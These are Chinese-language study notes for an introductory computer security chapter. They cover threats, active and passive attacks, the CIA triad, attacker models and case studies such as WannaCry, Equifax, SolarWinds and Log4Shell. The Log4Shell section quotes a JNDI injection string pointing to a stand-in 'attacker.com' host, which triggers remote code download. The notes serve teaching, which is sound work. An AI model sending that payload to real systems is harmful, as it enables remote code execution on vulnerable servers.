## 1.1 什么是计算机安全？（What Is Computer Security?）

### 定义

计算机安全：保护计算机系统的**资产（Assets）**，使其免受各种威胁或攻击。

> *"The protection of the assets of a computer system from various threats or attacks."*  
> 📍 *Slide 5, 19*

### 资产（Assets）的五种类型

| 资产类型 | 说明 | 举例 |
|----------|------|------|
| **Hardware（硬件）** | 物理设备 | 服务器、路由器、终端、存储设备 |
| **Software（软件）** | 程序与进程 | 操作系统、应用程序、数据库 |
| **Data（数据）** | 信息本身 | 用户信息、业务数据、密钥、日志 |
| **Human（人员）** | 使用系统的人 | 用户、管理员（人的操作也是保护对象） |
| **Other resources** | 其他资源 | 网络连接、通信链路、电力 |

### 资产的价值（Values of Assets）

- 资产的价值**因人、因时**而异
- 往往**无法精确估计**
- 保护的前提：**先确定什么资源是有价值的、对谁而言是有价值的**

## 1.2 基本术语（Basic Terms）⭐⭐⭐

课件用一张图来比喻三个核心概念的关系：

> **水（the water）是威胁，裂缝（the crack）是脆弱点，手指（the finger）是对策（暂时堵住）。**

> 📍 *Slide 9, 11*

### 四个核心术语

| 术语 | 课件定义 | 本质 |
|------|----------|------|
| **Vulnerability（脆弱点）** | 系统中能被利用并造成损害的**薄弱点**——系统本身的固有属性 | "裂缝"（内在的缺陷） |
| **Threat（威胁）** | 有可能引起损失或损害的**一系列条件**——客观存在，外在的因素 | "水"（外在的危险） |
| **Attack（攻击）** | 针对脆弱点，实现威胁的**具体行为** | "水从裂缝渗入"（实际发生的破坏） |
| **Countermeasure/Control（对策/控制）** | 阻止脆弱点被威胁利用的措施 | "手指堵裂缝"（防护手段） |

> **关键逻辑链**：只有正确认识（定义）脆弱点和威胁，才能正确设计和实施防御对策。  
> 📍 *Slide 9*

## 1.3 威胁的分类（Types of Threats）

课件区分了两个层次：

| 层次 | 英文 | 关注点 | 举例 |
|------|------|--------|------|
| **Safety（安全）** | 非恶意/意外 | 事故、自然灾害 | 设备故障、火灾、人为失误 |
| **Security（安全）** | 恶意/蓄意 | 故意攻击 | 黑客渗透、恶意软件 |

> 安全威胁分类有助于：明确威胁类型 → 评估优先级 → 制定针对性防护策略

## 1.4 被动攻击 vs 主动攻击 ⭐⭐⭐

**课件在最高层次上将攻击分为两类**，这是非常重要的框架性知识点：

### 被动攻击（Passive Attacks）

> *"A passive attack attempts to collect and exploit information from the system **without affecting normal system access**."*

| 特征 | 说明 |
|------|------|
| **手段** | 窃听（eavesdropping）、监测（monitoring）传输中的信息 |
| **目标** | 获取传输的数据 |
| **关键特点** | **不影响系统正常运行**，合法用户通常不会察觉 |
| **与LAN的关系** | 局域网数据传输特点是**广播**，天然利于被动窃听 |

- 对应破坏目标：**机密性（Confidentiality）**

### 主动攻击（Active Attacks）

> *"Active attacks involve **deliberate actions** by an attacker to access the information they need, typically **altering system resources** or affecting system operations."*

| 手段 | 英文 | 说明 |
|------|------|------|
| **伪装** | Masquerading | 冒充合法用户或系统 |
| **重放** | Replaying | 截获合法数据后重新发送 |
| **丢弃** | Discarding | 阻断或删除数据 |
| **篡改** | Modifying | 修改数据内容 |
| **注入** | Injecting | 插入恶意代码或消息 |

- 对应破坏目标：**完整性（Integrity）** 和 **可用性（Availability）**

> 📍 *Slide 13-16*

### 被动 vs 主动 速记表

| 对比维度 | 被动攻击 | 主动攻击 |
|----------|----------|----------|
| 是否影响系统运行 | 不影响 | 会改变系统资源或影响运行 |
| 是否容易被发现 | 难以觉察 | 相对容易被检测 |
| 目标 | 获取信息 | 篡改/破坏/伪造 |
| 破坏CIA中的 | 机密性 | 完整性 + 可用性 |

## 1.5 CIA 三元组（CIA Triad）⭐⭐⭐

> 📍 *Slide 23-29*

### 三大核心安全属性

```
         Confidentiality（机密性）
              ↗
           CIA
          ↙     ↘
  Integrity      Availability
 （完整性）       （可用性）
```

### 机密性（Confidentiality）

> *"Only authorized users and systems are allowed to access the protected data."*

只有授权的用户和系统才能访问被保护的数据。

**机密性被破坏的例子（课件列出）**：
1. 未授权的人访问数据项
2. 未授权的进程或程序访问数据项
3. 被授权访问某数据的人，访问了其他未授权的数据
4. 未授权的人得知了**近似数据值**（如知道工资在某范围内）
5. 未授权的人得知了一段**数据片段**（如获悉公司正在开发新产品）

> 📌 关键认知：机密性破坏不只限于"直接看到全部数据"，**哪怕1-bit信息的泄露也是机密性破坏**。

### 完整性（Integrity）

> *"The object is: **not modified**, modified only in **allowed ways**, modified only by **authorized entities**."*

一个对象的完整性 = 未被修改 + 只能以允许的方式修改 + 只能被授权主体修改。

**完整性被破坏的例子**：
| 破坏类型 | 场景 |
|----------|------|
| **数据篡改** | 黑客修改数据库记录（如金融交易） |
| **软件篡改** | 恶意软件感染并修改正常程序代码 |
| **网络中间人攻击** | 拦截并修改传输中的数据包 |
| **权限滥用** | 用户利用不应有的权限修改系统配置 |

### 可用性（Availability）

> *"The property of a system, service, or resource being **accessible and operational when needed**."*

系统/服务/资源在需要时能被访问和正常运行。

**可用性受威胁的例子**：
| 威胁类型 | 场景 |
|----------|------|
| **DoS攻击** | 大量请求耗尽服务器资源，合法用户无法访问 |
| **硬件故障** | 硬盘损坏/电源故障导致服务停机 |
| **网络中断** | 网络设备故障导致无法访问远程资源 |

### 两个额外的安全属性（课件补充）

| 属性 | 定义 |
|------|------|
| **Authentication（鉴别/认证）** | 能够确认资源或信息**所有者身份**的系统能力 |
| **Nonrepudiation（不可否认性）** | 确保发送者**不能对已发送的信息进行抵赖**的系统能力 |

## 1.6 攻击者（Attackers）⭐

> 📍 *Slide 20*

### 攻击者的角色

```
攻击者 → 发现脆弱点（具体、明确的切入点）
       → 发动攻击 → 实现威胁 → 造成损害（Harm）
```

### 攻击者的分类依据

攻击者拥有不同的：
- **Resources（资源/能力）**：从个人到国家级
- **Capabilities（技术水平）**：脚本小子到高级黑客
- **Motivation（动机）**：经济利益、政治目的、名声、恶作剧……

## 1.7 防御者与安全属性（Defenders & Security Properties）

> 📍 *Slide 21-22*

### 防御者的挑战

核心难题：**如何防御"未知攻击"？**
- 尽可能**覆盖广泛的对象和攻击面**
- 策略是**启发式的（Heuristic）**——猫捉老鼠的游戏
- 从**抽象和通用层面**思考安全架构问题

### 防御者的类型

| 角色 | 职责 |
|------|------|
| **网络安全团队（Network Security Team）** | 监控网络流量、检测恶意活动、配置防火墙和IDS、打补丁 |
| **IT管理员（IT Administrators）** | 定期更新OS和软件补丁、配置安全策略（强密码策略、访问控制） |
| **安全研究员（Security Researchers）** | 分析新兴攻击方法，提出新的防御技术和策略 |
| **终端防护软件（Endpoint Protection）** | 防病毒、反间谍软件，保护终端设备 |

> 各类防御者都利用**安全属性（Security Properties）**来保护系统，确保机密性、完整性和可用性。

## 1.8 MOM 模型（Method—Opportunity—Motive）⭐⭐

> 📍 *Slide 31*

```
攻击成功 = Method（方法）+ Opportunity（时机）+ Motive（动机）
```

| 要素 | 含义 |
|------|------|
| **Method（方法）** | 攻击者是否具备实施攻击的技能和工具 |
| **Opportunity（时机）** | 系统是否存在可利用的脆弱点 |
| **Motive（动机）** | 攻击者是否有意愿和目的发动攻击 |

> 课件此处以 SilentBanker 等案例说明攻击动机——金融恶意软件通过键盘记录窃取银行密码。

## 1.9 攻击动机与真实案例（Case Studies）

> 📍 *Slide 32-43*

### 为什么攻击终端用户机器？（Why compromise end user machines?）

| 动机 | 案例 | 技术手段 |
|------|------|----------|
| **1. 窃取凭证** | **SilentBanker**（AITB - 浏览器中间人攻击） | 注入恶意JS到银行登录页面，同时将凭证发给攻击者 |
| | **Zbot** | 类似机制，键盘记录银行密码 |
| | **FinSpy**（移动端） | iOS/Android上的间谍软件：窃取联系人、通话记录、GPS、短信、加密聊天消息 |
| **2. 勒索** | **WannaCry**（2017.5.12） | 利用SMB漏洞（EternalBlue，2017.4.14披露），蠕虫自动传播，3周武器化 |
| **3. 挖矿** | Bitcoin Mining恶意软件 | Trojan.Win32.Miner系列 |

### 为什么攻击服务器？（Server-side attacks）

| 动机 | 案例 |
|------|------|
| **数据盗窃** | Equifax（2017.7）：约1.43亿用户数据泄露，利用Apache Struts已知漏洞（RCE） |
| **政治动机** | DNC攻击（2015）、乌克兰电网攻击（2015-2017） |
| **感染访问用户** | 水坑攻击等 |

### 服务器攻击的典型步骤（Kill Chain / 杀伤链）

```
Reconnaissance（侦察）
    ↓
Foothold: initial breach（建立立足点：初次突破）
    ↓
Internal reconnaissance（内部侦察）
    ↓
Lateral movement（横向移动）
    ↓
Data extraction（数据提取）
    ↓
Exfiltration（数据渗漏）
```

> 课程中将讨论在每个步骤可用的安全工具——**但不存在完整的万全之策**。

### 案例1：Log4Shell（Log4j漏洞）

| 时间线 | 事件 |
|--------|------|
| 2021.11.21 | Log4j 2远程代码执行（RCE）漏洞被发现 |
| 影响 | 超过7000个代码仓库和大量Java项目 |

**攻击原理**：Log4j可加载并运行远程代码来处理包含 `\${jndi:ldap://attacker.com}` 的日志请求 → LDAP查询 → HTTP GET → 下载恶意Java代码 → 执行

**利用方式**：Khonsari勒索软件、XMRIG挖矿程序、Orcus远程访问木马

**防御思路**：**隔离（Isolation）**——沙箱化log4j库或整个应用

### 案例2：SolarWinds Orion（2020供应链攻击）

| 时间线 | 事件 |
|--------|------|
| 2020.2.20 | 攻击者入侵SolarWinds软件构建过程 |
| 2020.12 | 才被发现，潜伏约10个月 |
| 影响 | 约18000个客户组织 |

**攻击手法（Sunspot恶意软件）**：
1. `taskhostsvc.exe` 运行在SolarWinds构建系统上
2. 监控 `MsBuild.exe` 进程（Visual Studio编译）
3. 检测到正在构建Orion软件时 → **偷偷替换** `InventoryManager.cs` 为恶意版本
4. 编译完成后 → **恢复原始文件**，不留痕迹

## 1.10 访问控制（Access Control）

> 📍 *Slide 52*

访问控制是计算机安全的**核心范式之一**：

| 概念 | 英文 | 角色 | 说明 |
|------|------|------|------|
| **主体** | Subject | 发起方 | 人、进程或程序 |
| **客体** | Object | 接受方 | 数据项、资源 |
| **访问类型** | Access Mode | 操作 | 读（Read）、写（Write）、执行（Execute） |
| **安全策略** | Policy | 规则 | 规定哪些主体能对哪些客体进行何种访问 |

> *"为了实施安全策略，计算机安全需要控制所访问模式下所有主体对所有受保护客体的访问。"*

## 1.11 可信计算基（TCB）⭐

> 📍 *Slide 50-51*

### 核心问题：我们到底能信任什么？

课件用一个层层递进的追问来引入 TCB 的概念：

```
买了一台新笔记本 → 能信任它吗？
│  → 可能OS和应用被植入后门 → 重装OS
│    → 怎么重装？不能信任OS来重装OS → 从USB启动Tails
│      → 能信任BIOS/UEFI吗？→ 不能！（如ShadowHammer 2018）
│        → 能信任主板吗？软件更新呢？
```

**结论**：严格来说，**什么都不能信任**——任何东西都可能被攻破。  
但这样我们无法推进。所以：

> **TCB（Trusted Computing Base）**：**假设系统中某个最小部分是未被攻破的**，然后在它之上构建安全环境。

> 📌 课件指出：这将在 Chapter 5 中详细展开。

## 1.12 控制/对策（Controls / Countermeasures）

> 📍 *Slide 53-55*

### 控制的分类

课件用三类控制来应对威胁：

| 控制类型 | 比喻 |
|----------|------|
| **边缘控制** | 边界防护 |
| **遏制控制** | 限制攻击扩散 |
| **人为控制** | 管理与策略 |

### Ch01 总结（课件原文）

> 1. **Vulnerabilities** are weaknesses in a system; **threats** exploit those weaknesses; **controls** protect those weaknesses from exploitation
> 2. **Confidentiality, integrity, and availability** are the three basic security properties
> 3. **Different attackers** pose different kinds of threats based on their **capabilities and motivations**
> 4. **Different controls** address different threats; controls come in many flavors and can exist at various points in the system

## 1.14 学习本课程的方法（课件提出）

> 📍 *Slide 3*

## 1.15 本章名词解释速记

| 术语 | 一句话答题模板 |
|------|---------------|
| **Vulnerability** | 系统中可被利用并造成损害的**薄弱点/缺陷**，属于系统内在属性 |
| **Threat** | 可能对资产造成损失或损害的**潜在条件或行为者**，客观存在 |
| **Attack** | 利用脆弱点、实现威胁的**具体恶意行为** |
| **Countermeasure/Control** | 阻止脆弱点被威胁利用的**防护措施** |
| **CIA Triad** | 信息安全的三个基本属性：机密性（授权访问）、完整性（授权修改）、可用性（需要时可访问） |
| **Passive Attack** | 不改变系统资源的攻击，以**窃听和监测**为主，难以被察觉，破坏机密性 |
| **Active Attack** | 改变系统资源的**蓄意行为**，包括伪装、重放、篡改、注入，破坏完整性和可用性 |
| **Defense in Depth** | 在不同层次部署多层安全措施，一层被突破仍有其他层保护 |
| **TCB** | 可信计算基，假设系统中最小的部分未受破坏，在其上构建安全环境 |
| **Access Control** | 限制主体对客体访问的安全机制 |
